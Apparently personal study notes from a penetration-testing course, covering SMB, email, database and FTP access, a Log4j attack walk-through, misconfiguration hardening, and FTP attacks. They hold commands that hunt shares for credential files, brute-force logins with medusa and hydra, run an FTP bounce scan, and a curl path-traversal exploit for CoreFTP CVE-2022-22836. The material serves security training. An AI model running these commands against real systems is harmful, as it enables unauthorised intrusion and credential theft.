\\Interacting with COmmon Services
Vulnerabilities are commonly discovered by people who use and understand technology, a protocol, or a service. As we evolve in this field, we will find different services to interact with, and we will need to evolve and learn new technology constantly.

To be successful at attacking a service, we need to know its purpose, how to interact with it, what tools we can use, and what we can do with it. This section will focus on common services and how we can interact with them.
\\File Share Services
\\Server Message Block (SMB)
\\Windows \\192.168.1.1\share
Windows has two command-line shells: the Command shell and PowerShell. Each shell is a software program that provides direct communication between us and the operating system or application, providing an environment to automate IT operations.
\\Windows CMC-Director
The command net use connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter n.
\\Window CMD - Net use
$>net use n: \\192.168.1.1\share
$>net use n: \\192.168.1.1\share /user:plaintext Password123
With the shared folder mapped as the n drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
\\Window CMD - Dir 
$dir n: /a-d /s /b | find /c ":\"
Syntax	Description
dir	Application
n:	Directory or drive to search
/a-d	/a is the attribute and -d means not directories
/s	Displays files in a specified directory and all subdirectories
/b	Uses bare format (no heading information or summary)
$dir n:\*cred* /s /b 
n:\Contracts\private\credentials/txt
$dir n:\*secret* /s /b n:\Contracts\private\secret.txt
-If we want to search for a specific word within a text file, we can use findstr.
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr

\\Windows CMD - Findstr
$findstr /s /i cred n:\*.*

\\Windows Powershell
PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called cmdlets. 
-Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets. Let's replicate the same commands now using Powershell.

\\Windows PowerShell 
$Get-ChildItem \\192.168.1.1\Share\
-instead of net use we can use New-PSDrive in PowerShell
$New-PSDrive -Name "N" -Root "\\192.168.1.1\share" -PSProvider "FileSystem"
To provide a username and password with Powershell, we need to create a PSCredential object. It offers a centralized way to manage usernames, passwords, and credentials.
https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.4.0

\\Windows PowerShell - PSCredential Object
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
$New-PSDrive -Name "N" -Root "\\192.168.1.1\share" -PSProvider "FileSystem" - Credential $cred
We can use the property -Include to find specific items from the directory specified by the Path parameter.

$Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
-The Select-String cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use Select-String similar to grep in UNIX or findstr.exe in Windows.

\\Windows PowerShell - Select-String
$Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -list
CLI enables IT operations to automate routine tasks like user account management, nightly backups, or interaction with many files. We can perform operations more efficiently by using scripts than the user interface or GUI.

\\Linux
Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.

\\Linux-Mount
$sudo mkdir /mnt/Finance
$sudo mkdir /mount -t cifs -o username=plaintext,password=Password123,domain=.//192.168.1.1/finance /mnt/Finance
<alternative>
$mount -t cifs //192.168.1.1/Finance /mnt/Finance -o credentials=/path/credentialsfile
CredentialFile
Code: txt
username=plaintext
password=Password123
domain=.
Note: We need to install cifs-utils to connect to an SMB share folder. To install it we can execute from the command line sudo apt install cifs-utils.
-Once a shared folder is mounted, you can use common Linux tools such as find or grep to interact with the file structure. Let's hunt for a filename that contains the string cred:
\\Linux-Find
$find /mnt/Finance/ -name *cred*
$grep -rn /mnt/Finance/ -ie cred
\\Other service
FTP,TFTP,NFS that we can attach (mount) 
There are other file-sharing services such as FTP, TFTP, and NFS that we can attach (mount) using different tools and commands. However, once we mount a file-sharing service, we must understand that we can use the available tools in Linux or Windows to interact with files and directories. As we discover new file-sharing services, we will need to investigate how they work and what tools we can use to interact with them.

\\email 
SMNP delivery email through internet 
likewise protocol must be retrive an email from a service, POP3 and IMAP
We can use a mail client such as Evolution, the official personal information manager, and mail client for the GNOME Desktop Environment. We can interact with an email server to send or receive messages with a mail client. To install Evolution, we can use the following command:

\\Linux Install Evolution
$sudo apt-get install Evolution
Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution export WEBKIT_FORCE_SANDBOX=0 && evolution.

\\Video - Connecting to IMAP and SMTP using Evolution
We can use the domain name or IP address of the mail server. If the server uses SMTPS or IMAPS, we'll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting). We can use the Check for Supported Types option under authentication to confirm if the server supports our selected method.

\\\Databases
Databases are typically used in enterprises, and most companies use them to store and manage information. There are different types of databases, such as Hierarchical databases, NoSQL (or non-relational) databases, and SQL relational databases. We will focus on SQL relational databases and the two most common relational databases called MySQL & MSSQL. We have three common ways to interact with databases:
1.	Command Line Utilities (mysql or sqsh)
2.	Programming Languages
3.	A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio.
\\Command Line Utilities
To interact with MSSQL (Microsoft SQL Server) with Linux we can use sqsh or sqlcmd if you are using Windows. Sqsh is much more than a friendly prompt. It is intended to provide much of the functionality provided by a command shell, such as variables, aliasing, redirection, pipes, back-grounding, job control, history, command substitution, and dynamic configuration. We can start an interactive SQL session as follows:

\\Linux - SQSH 
$sqsh -S 10.129.20.13 -U username -P Password123
The sqlcmd utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:
At the command prompt.
In Query Editor in SQLCMD mode.
In a Windows script file.
In an operating system (Cmd.exe) job step of a SQL Server Agent job.

\\Window -SQL CMD
$>sqlcmd -S 10.129.20.23 -U username -P password

\\MySQL 
To interact with MySQL, we can use MySQL binaries for Linux (mysql) or Windows (mysql.exe). MySQL comes pre-installed on some Linux distributions, but we can install MySQL binaries for Linux or Windows using this guide. Start an interactive SQL Session using Linux:
\\Linux Mysql
[!bash!]$ mysql -u username -pPassword123 -h 10.129.20.13
GUI Application
To install dbeaver using a Debian package we can download the release .deb package from https://github.com/dbeaver/dbeaver/releases and execute the following command:
Install dbeaver
[!bash!]$ sudo dpkg -i dbeaver-<version>.deb
Run dbeaver
[!bash!]$ dbeaver &
To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).

\\Tools
Tools to Interact with Common Services
SMB	FTP	Email	Databases
smbclient	ftp	Thunderbird	mssql-cli
CrackMapExec	lftp	Claws	mycli
SMBMap	ncftp	Geary	mssqlclient.py
Impacket	filezilla	MailSpring	dbeaver
psexec.py	crossftp	mutt	MySQL Workbench
smbexec.py		mailutils	SQL Server Management Studio or SSMS
sendEmail	
swaks	
sendmail

General TroubleshootingSome reasons why we may not have access to a resource:

Authentication
Privileges
Network Connection
Firewall Rules
Protocol Support

\\The Concept of Attacks
Source --> process --> privileges --> Destination
The concept is based on four categories that occur for each vulnerability. First, we have a Source that performs the specific request to a Process where the vulnerability gets triggered. Each process has a specific set of Privileges with which it is executed. Each process has a task with a specific goal or Destination to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.
\\Source
We can generalize Source as a source of information used for the specific task of a process
code , Libraries, Config , APIs, User input
\Log4j CVE-2021-44228 which was published at the end of 2021
\\process
The Process is about processing the information forwarded from the source. 
PID, Input, Data processing, Variables, logging
\\Log4j 
The process of Log4j is to log the User-Agent as a string using a function and store it in the designated location. T

\\Privileges
Privileges are present in any system that controls processes. These serve as a type of permission that determines what tasks and actions can be performed on the system. In simple terms, it can be compared to a bus ticket. 
-What made the Log4j vulnerability so dangerous was the Privileges that the implementation brought. Logs are often considered sensitive because they can contain data about the service, the system itself, or even customers
system, user, groups, policies, Rule
\\Destination
Every task has at least one purpose and goal that must be fulfilled. Logically, if any data set changes were missing or not stored or forwarded anywhere, the task would be generally unnecessary.
local, Network

The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the Destination in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (RCE) vulnerability.
Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

Initiation of the Attack
Step	Log4j	Concept of Attacks - Category
1.	The attacker manipulates the user agent with a JNDI lookup command.	Source
2.	The process misinterprets the assigned user agent, leading to the execution of the command.	Process
3.	The JNDI lookup command is executed with administrator privileges due to logging permissions.	Privileges
4.	This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker.	Destination

Trigger Remote Code Execution
Step	Log4j	Concept of Attacks - Category
5.	After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process.	Source
6.	Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.	Process
7.	The malicious code is executed with administrator privileges due to logging permissions.	Privileges
8.	The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.	Destination

\\===========================================
Service Misconfigurations
\\Authentication
-Anonymous Authentication
-Misconfigured Access Right
Administrators need to plan their access rights strategy, and there are some alternatives such as Role-based access control (RBAC), Access control lists (ACL). If we want more detailed pros and cons of each method, we can read Choosing the best access control strategy by Warren Parad from Authress.
-Unnecessary Defaults
Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
Default accounts and their passwords are still enabled and unchanged.
Error handling reveals stack traces or other overly informative error messages to users.
For upgraded systems, the latest security features are disabled or not configured securely.
\\Preventing Misconfiguration 
Admin interfaces should be disabled.
Debugging is turned off.
Disable the use of default usernames and passwords.
Set up the server to prevent unauthorized access, directory listing, and other issues.
Run scans and audits regularly to help discover future misconfigurations or missing fixes.

-The OWASP Top 10 provides a section on how to secure the installation processes:

A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. In addition, this process should be automated to minimize the effort required to set up a new secure environment.

A minimal platform without unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.

A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see A06:2021-Vulnerable and Outdated Components). Review cloud storage permissions (e.g., S3 bucket permissions).

A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).

Sending security directives to clients, e.g., security headers.

An automated process to verify the effectiveness of the configurations and settings in all environments.

\\\\\==========================================
Finding Sensitive information
When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Therefore, every single piece of information is essential.

\\\\\======================================
Attacking FTP
The File Transfer Protocol (FTP) is a standard network protocol used to transfer files between computers. It also performs directory and files operations, such as changing the working directory, listing files, and renaming and deleting directories or files. By default, FTP listens on port TCP/21.
To attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities.
\\Enumeration
$sudo nmap -sC -sV -p 21 192.168.2.142
-sC nmap scrip -sV version enum banner m,,
\\Misconfigurations
 To access with anonymous login, we can use the anonymous username and no password. 
\\Anonymous Authentication
$ftp 192.168.2.142
ls cd get mget, upload put mput 
\\Protocol Specifics Attacks
Many different attacks and methods are protocol-based. However, it is essential to note that we are not attacking the individual protocols themselves but the services that use them. Since there are dozens of services for a single protocol and they process the corresponding information differently, we will look at some.
\\Bruteforcing 
Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.
$medusa -u <username> -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
\\FTP Bounce Attack
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.
-Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.
 https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/
 $nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
 -b can be used to perform an FTP bounce aattack

 <test>
hydra -t 45 -L users.list -P passwords.list ssh://<ip> -q 
\\Lastest FTP vulnerabilities
In this case, we will discuss the CoreFTP before build 727 vulnerability assigned CVE-2022-22836. This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.
\\The Concept of the Attack
This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. Let's have a look at the attack based on our concept. The exploit for this attack is relatively straightforward, based on a single cURL command.
https://www.exploit-db.com/exploits/50652
\\CoreFTP Exploitation
$curl -k -X PUT -H "Host: <ip>" --basic -u <username>:<password> --data-binary "Poc." --path-as-is https://<IP>/../../../../../../whoops
